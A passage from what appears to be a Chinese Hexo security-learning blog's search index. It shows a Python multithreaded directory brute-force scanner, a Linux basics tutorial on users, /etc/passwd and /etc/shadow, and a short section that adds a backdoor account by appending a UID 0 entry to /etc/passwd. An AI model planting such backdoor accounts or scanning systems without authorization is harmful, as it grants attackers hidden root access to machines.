class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> queue<br><span class="hljs-keyword">import</span> urllib3<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment">#定义路径获取函数get_path()</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_path</span>(<span class="hljs-params">url,file=<span class="hljs-string">&quot;dict.txt&quot;</span></span>):<span class="hljs-comment">#注意：字典放在和脚本同一目录下即可</span><br>    path_queue = queue.Queue()<br>    f = <span class="hljs-built_in">open</span>(file,<span class="hljs-string">&#x27;r&#x27;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.readlines():<br>        path = url + i.strip()<br>        path_queue.put(path)<br>    f.close()<br>    <span class="hljs-keyword">return</span> path_queue<br><br><span class="hljs-comment">#定义目录爆破函数get_url</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_url</span>(<span class="hljs-params">path_queue</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> path_queue.empty():<br>        <span class="hljs-keyword">try</span>:<br>            url = path_queue.get()<br>            http = urllib3.PoolManager()<span class="hljs-comment">#1个PoolManager实例来生成请求, 由该实例对象处理与线程池的连接以及线程安全的所有细节</span><br>            response = http.request(<span class="hljs-string">&#x27;GET&#x27;</span>,url)<br>            <span class="hljs-keyword">if</span> response.status == <span class="hljs-number">200</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[%d] =&gt; %s&quot;</span> % (response.status,url))<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">else</span>:<br>        sys.exit()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">url,threadNum</span>):<br>    path_queue = get_path(url)<br><br>    threads = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(threadNum):<br>        t = threading.Thread(target=get_url,args=(path_queue,))<br>        threads.append(t)<br>        t.start()<br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>        t.join()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    start = time.time()<br>    url = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;enter an url:&quot;</span>)<br>    threadnum = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;enter threads:&quot;</span>))<br>    main(url,threadnum)<br>    end = time.time()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;总共耗时%.2f&quot;</span>%(end-start))<br><br>  <br>    <br></code></pre></td></tr></table></figure><p><img src="/2023/08/04/Python%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E8%84%9A%E6%9C%AC/image-20230804152914817.png" alt="image-20230804152914817"></p>]]></content>
    
    
    <categories>
      
      <category>Python脚本</category>
      
    </categories>
    
    
    <tags>
      
      <tag>目录扫描</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux基础</title>
    <link href="/2023/08/01/Linux%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/08/01/Linux%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><p>系统目录：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs livescript">├── bin -&gt; usr/bin <span class="hljs-comment"># 用于存放二进制命令</span><br>├── boot <span class="hljs-comment"># 内核及引导系统程序所在的目录</span><br>├── dev <span class="hljs-comment"># 所有设备文件的目录（如磁盘、光驱等）</span><br>├── etc <span class="hljs-comment"># 配置文件默认路径、服务启动命令存放目录</span><br>├── home <span class="hljs-comment"># 用户家目录，root用户为/root</span><br>├── lib -&gt; usr/lib <span class="hljs-comment"># 32位库文件存放目录</span><br>├── lib64 -&gt; usr/lib64 <span class="hljs-comment"># 64位库文件存放目录</span><br>├── media <span class="hljs-comment"># 媒体文件存放目录</span><br>├── mnt <span class="hljs-comment"># 临时挂载设备目录</span><br>├── opt <span class="hljs-comment"># 自定义软件安装存放目录</span><br>├── proc <span class="hljs-comment"># 进程及内核信息存放目录</span><br>├── root <span class="hljs-comment"># Root用户家目录</span><br>├── run <span class="hljs-comment"># 系统运行时产生临时文件，存放目录</span><br>├── sbin -&gt; usr/sbin <span class="hljs-comment"># 系统管理命令存放目录</span><br>├── srv <span class="hljs-comment"># 服务启动之后需要访问的数据目录</span><br>├── sys <span class="hljs-comment"># 系统使用目录</span><br>├── tmp <span class="hljs-comment"># 临时文件目录</span><br>├── usr <span class="hljs-comment"># 系统命令和帮助文件目录</span><br>└── <span class="hljs-keyword">var</span> <span class="hljs-comment"># 存放内容易变的文件的目录</span><br><br></code></pre></td></tr></table></figure><h2 id="一、目录操作"><a href="#一、目录操作" class="headerlink" title="一、目录操作"></a>一、目录操作</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">pwd</span>查看当前工作目录<br><span class="hljs-keyword">clear</span>清除屏幕<br><span class="hljs-keyword">cd</span> ~当前用户目录<br><span class="hljs-keyword">cd</span> /根目录<br><span class="hljs-keyword">cd</span> -上一次访问的目录<br><span class="hljs-keyword">cd</span> <span class="hljs-string">..</span>返回上一级目录<br></code></pre></td></tr></table></figure><h3 id="1-1-查看目录内信息"><a href="#1-1-查看目录内信息" class="headerlink" title="1.1 查看目录内信息"></a>1.1 查看目录内信息</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ls</span>仅罗列出当前文件名或目录名<br><span class="hljs-keyword">ls</span> -<span class="hljs-keyword">a</span> 列出目录下所有文件，包括以.开头的隐含文件<br><span class="hljs-keyword">ls</span> -<span class="hljs-keyword">l</span>列出文件的详细信息<br><span class="hljs-keyword">ll</span>同<span class="hljs-keyword">ls</span> -<span class="hljs-keyword">l</span><br></code></pre></td></tr></table></figure><p><img src="/2023/08/01/Linux%E5%9F%BA%E7%A1%80/1.png"></p><h3 id="1-2-创建目录"><a href="#1-2-创建目录" class="headerlink" title="1.2 创建目录"></a>1.2 创建目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir aaa在当前目录下创建aaa目录，相对路径<br>mkdir ./bbb在当前目录下创建bbb目录，相对路径<br>mkdir /ccc在根目录下创建ccc目录，绝对路径<br></code></pre></td></tr></table></figure><h3 id="1-3-搜素命令"><a href="#1-3-搜素命令" class="headerlink" title="1.3 搜素命令"></a>1.3 搜素命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -name &#x27;b&#x27;查询根目录下（包括子目录），名以b的目录和文件；<br>find / -name &#x27;b*&#x27;查询根目录下（包括子目录），名以b开头的目录和文件； <br>find . -name &#x27;b&#x27;查询当前目录下（包括子目录），名以b的目录和文件；<br></code></pre></td></tr></table></figure><h3 id="1-4-重命名"><a href="#1-4-重命名" class="headerlink" title="1.4 重命名"></a>1.4 <strong>重命名</strong></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mv 原先目录 文件的名称 <br>mv tomcat001 tomcat <br></code></pre></td></tr></table></figure><p><img src="/2023/08/01/Linux%E5%9F%BA%E7%A1%80/2.png" alt="image-20230801103408344"></p><h3 id="1-5-剪切命令"><a href="#1-5-剪切命令" class="headerlink" title="1.5 剪切命令"></a>1.5 剪切命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mv/aaa /bbb    将根目录下的aaa目录，移动到bbb目录下(假如没有bbb目录，则重命名为bbb)；<br>mvbbbb usr/bbb将当前目录下的bbbb目录，移动到usr目录下，并且修改名称为bbb；<br>mvbbbb usr/aaa将当前目录下的bbbb目录，移动到usr目录下，并且修改名称为aaa；<br></code></pre></td></tr></table></figure><h3 id="1-6-复制目录"><a href="#1-6-复制目录" class="headerlink" title="1.6 复制目录"></a>1.6 <strong>复制目录</strong></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cp -r /aaaa /bbb将/目录下的aaa目录复制到/bbb目录下，在/bbb目录下的名称为aaa<br>cp -r aaaa/ nps/a将当前目录下的aaaa目录复制到/bbb目录下，且修改名为a;<br></code></pre></td></tr></table></figure><p><img src="/2023/08/01/Linux%E5%9F%BA%E7%A1%80/3.png" alt="image-20230801104552930"></p><h3 id="1-7-强制删除指定目录"><a href="#1-7-强制删除指定目录" class="headerlink" title="1.7 强制删除指定目录"></a>1.7 强制删除指定目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rm -rf /bbb<br></code></pre></td></tr></table></figure><h2 id="二、账户和权限"><a href="#二、账户和权限" class="headerlink" title="二、账户和权限"></a>二、账户和权限</h2><h3 id="2-1-查看主机相关信息"><a href="#2-1-查看主机相关信息" class="headerlink" title="2.1 查看主机相关信息"></a>2.1 查看主机相关信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">uname查看系统相关信息<br>-a：显示主机名、内核版本、硬件平台等详细信息<br>-r：显示内核版本号、<br><br>hostname查看主机名<br><br></code></pre></td></tr></table></figure><h3 id="2-2-用户账户"><a href="#2-2-用户账户" class="headerlink" title="2.2  用户账户"></a>2.2  用户账户</h3><p>根据拥有的权限不同，可以分为三种账户</p><ul><li>超级用户：root用户是Linux操作系统中默认的超级用户账号，对本主机拥有最高的权限。系统中超级用户是唯一 的。</li><li>普通用户：由root用户或其他管理员用户创建，拥有的权限会受到限制，一般只在用户自己的宿主目录中拥有完整权限。</li><li>程序用户：在安装Linux操作系统及部分应用程序时，会添加一些特定的低权限用户账号，这些用户一般不允许登录到系统，仅用于维持系统或某个程序的正常运行，如bin. daemon、ftp、 mail等。</li></ul><h3 id="2-3-组账号"><a href="#2-3-组账号" class="headerlink" title="2.3 组账号"></a>2.3 组账号</h3><ul><li>基本组（私有组）：基本组账号只有一个，一般为创建用户时指定的组，在etc&#x2F;passwd文件中第4字段记录的即为该用户的基本组GID号</li><li>附加组（公共组）：用户除了基本组以外，额外添加指定的组</li></ul><h3 id="2-4-UID和GID"><a href="#2-4-UID和GID" class="headerlink" title="2.4 UID和GID"></a>2.4 UID和GID</h3><ul><li>UID：用户标识号</li><li>GID：组标识号</li><li>一般情况下root账户的UID和GID都为固定值0</li><li>UID：取值范围是0-65535。0是超级用户root的标识号，1-99由系统保留，作为管理账号，普通用户的标识号从100开始。在Linux系统中，这个界限是500。</li></ul><h3 id="2-5-用户帐号文件"><a href="#2-5-用户帐号文件" class="headerlink" title="2.5 用户帐号文件"></a>2.5 用户帐号文件</h3><p>&#x2F;etc&#x2F;passwd：</p><p><img src="/2023/08/01/Linux%E5%9F%BA%E7%A1%80/4.png" alt="image-20230801143120603"></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">用户名:用户密码占位符<span class="hljs-string">&#x27;X&#x27;</span>:UID:GID:注释性描述:主目录:登录shell信息(<span class="hljs-regexp">/bin/</span>bash为可登陆系统，<span class="hljs-regexp">/sbin/</span> nologin和<span class="hljs-regexp">/bin/</span> <span class="hljs-keyword">false</span>为禁止用户登陆系统)<br></code></pre></td></tr></table></figure><p>&#x2F;etc&#x2F;shadow：真正的加密后的用户口令字存放到&#x2F;etc&#x2F;shadow</p><p><img src="/2023/08/01/Linux%E5%9F%BA%E7%A1%80/5.png" alt="image-20230801143157717"></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志</span><br></code></pre></td></tr></table></figure><ol><li>如果为空，则对应用户没有口令，登录时不需要口令；</li><li>星号代表帐号被锁定；</li><li>双叹号表示这个密码已经过期了；</li><li><code>$6$</code>开头的，表明是用SHA-512加密；</li><li><code>$1$</code>表明是用MD5加密；</li><li><code>$2$</code> 是用Blowfish加密；</li><li><code>$5$</code> 是用 SHA-256加密；</li></ol><h2 id="三、添加用户后门"><a href="#三、添加用户后门" class="headerlink" title="三、添加用户后门"></a>三、添加用户后门</h2><p><img src="/2023/08/01/Linux%E5%9F%BA%E7%A1%80/7.png" alt="image-20230801143855256"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">生成密码： openssl passwd -1 -salt admin 123456 <br>-1 的意思是使用md5crypt加密算法 <br>-salt 指定盐为admin <br>123456 明文密码<br></code></pre></td></tr></table></figure><p>追加命令（UID&#x3D;0）：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">echo</span> <span class="hljs-string">&#x27;admin:<span class="hljs-variable">$1</span><span class="hljs-variable">$admin</span><span class="hljs-variable">$LClYcRe</span>.ee8dQwgrFc5nz.:0:0::/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd<br></code></pre></td></tr></table></figure><p><img src="/2023/08/01/Linux%E5%9F%BA%E7%A1%80/8.png" alt="image-20230801144122907"></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Azzm</title>
    <link href="/2023/07/31/azzm/"/>
    <url>/2023/07/31/azzm/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="6eac5b14c481274bfa4442d16d1e91cad3b64b421da391e2ba2a112ad45346c6">08ac244ee27af9f4b938f105774e559501686e3142b6eca099d306265b514d9038852d7906780708240a9e41e35e3b0d0d8ddc61e6d2cb492285e7cc4ced6221c6215cb96530d2ccfa776b9a297bd31d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>❤</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Azzm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/07/29/hello-world/"/>
    <url>/2023/07/29/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color:red;background:背景颜色;font-size:文字大小;font-family:字体;&quot;</span>&gt;</span>define(常量名称,常量值)<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
